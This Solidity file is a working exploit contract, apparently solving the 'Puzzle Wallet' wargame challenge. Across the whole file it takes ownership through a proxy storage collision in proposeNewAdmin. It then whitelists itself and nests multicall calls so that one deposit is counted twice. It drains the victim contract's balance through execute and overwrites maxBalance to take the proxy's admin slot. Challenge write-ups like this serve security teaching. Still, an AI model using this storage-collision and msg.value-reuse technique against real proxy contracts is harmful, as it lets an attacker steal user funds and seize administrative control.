// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPuzzleWallet.sol";

contract PuzzleWalletAttack {
    IPuzzleWallet private immutable victimPuzzleWallet;

    constructor(IPuzzleWallet victimPuzzleWallet_) {
        victimPuzzleWallet = victimPuzzleWallet_;
    }

    function attack() external payable {
        require(msg.value == address(victimPuzzleWallet).balance, "PuzzleWallet: Value must be eq");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = address(victimPuzzleWallet).call(
            abi.encodeWithSignature("proposeNewAdmin(address)", address(this))
        );

        require(isSuccess, "PuzzleWallet: Call error");

        require(address(this) == victimPuzzleWallet.owner(), "PuzzleWallet: Wrong address");

        victimPuzzleWallet.addToWhitelist(address(this));

        require(victimPuzzleWallet.whitelisted(address(this)), "PuzzleWallet: Wrong res");

        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = abi.encodeWithSelector(victimPuzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(victimPuzzleWallet.multicall.selector, multicallData);

        data[1] = data[0];

        victimPuzzleWallet.multicall{ value: msg.value }(data);

        uint256 balance = victimPuzzleWallet.balances(address(this));

        require(2 * msg.value == balance, "PuzzleWallet: Wrong balance");

        victimPuzzleWallet.execute(address(this), balance, "");

        // solhint-disable-next-line reason-string
        require(0 == address(victimPuzzleWallet).balance, "PuzzleWallet: Wrong victim balance");

        victimPuzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(msg.sender == address(uint160(victimPuzzleWallet.maxBalance())), "PuzzleWallet: Attack failed");
    }

    // solhint-disable-next-line no-empty-blocks
    receive() external payable {}
}
